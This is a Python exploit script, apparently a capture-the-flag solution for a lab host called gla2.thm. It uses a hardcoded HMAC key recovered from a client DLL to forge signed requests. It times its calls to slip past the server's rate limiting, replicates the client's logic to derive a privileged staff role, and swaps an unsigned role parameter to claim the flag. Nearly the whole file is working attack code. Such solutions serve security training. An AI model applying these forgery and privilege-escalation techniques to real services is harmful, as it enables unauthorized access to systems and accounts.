#!/usr/bin/env python3
import hashlib
import hmac
import time
import requests

# Base URL (ensure gla2.thm is mapped to the target IP in /etc/hosts)
BASE_URL = "http://gla2.thm"

# Hardcoded HMAC signing key recovered from PoPClient in GrandLarcenyAuto.dll
SIGN_KEY = b"gla2_crew_sign_v1_2f9b6c8ad14e"


def sign(data: str) -> str:
    """Generate an HMAC-SHA256 signature formatted as hexadecimal."""
    return hmac.new(SIGN_KEY, data.encode("utf-8"), hashlib.sha256).hexdigest()


def derive_staff_role(stash_order: list) -> str:
    """Replicates the client's DeriveStaffRole() logic via SHA-1."""
    role_str = (
        f"heat5_stash{stash_order[0]}_stash{stash_order[1]}"
        f"_stash{stash_order[2]}_vault"
    )
    return hashlib.sha1(role_str.encode("utf-8")).hexdigest()


def main():
    session = requests.Session()

    print("[*] Starting session...")
    resp = session.post(f"{BASE_URL}/session", json={})
    resp.raise_for_status()
    data = resp.json()

    session_id = data["session_id"]
    token = data["token"]
    stash_order = data["stash_order"]

    print(f"[+] Session ID  : {session_id}")
    print(f"[+] Stash Order : {stash_order}")
    print(f"[+] Initial Token: {token}")

    # Build the required checkpoint traversal sequence
    checkpoints = [
        "heat5",
        f"stash{stash_order[0]}",
        f"stash{stash_order[1]}",
        f"stash{stash_order[2]}",
        "vault",
    ]

    for step in checkpoints:
        print(f"[*] Sleeping 6.5s to bypass server anti-cheat rate-limiting...")
        time.sleep(6.5)

        sig = sign(f"{session_id}|{step}|{token}")
        payload = {
            "session_id": session_id,
            "step": step,
            "token": token,
            "sig": sig,
        }

        print(f"[*] Sending checkpoint: {step}")
        cp_resp = session.post(f"{BASE_URL}/checkpoint", json=payload)
        cp_data = cp_resp.json()

        if "error" in cp_data:
            print(f"[-] Checkpoint failed: {cp_data}")
            return

        # Update the token with the fresh token issued by the server
        if "token" in cp_data and cp_data["token"]:
            token = cp_data["token"]
            print(f"[+] New token received: {token}")

    # Derive the privileged staff role
    staff_role = derive_staff_role(stash_order)
    print(f"[+] Derived Staff Role: {staff_role}")

    # Wait before final claim
    print("[*] Sleeping 6.5s before claiming flag...")
    time.sleep(6.5)

    claim_sig = sign(f"{session_id}|claim|{token}")
    claim_payload = {
        "session_id": session_id,
        "role": staff_role,  # Bypass: unsigned parameter swapped to staff role
        "token": token,
        "sig": claim_sig,
    }

    print("[*] Sending forged /claim request...")
    claim_resp = session.post(f"{BASE_URL}/claim", json=claim_payload)
    print(f"[+] Server Response:\n{claim_resp.text}")


if __name__ == "__main__":
    main()
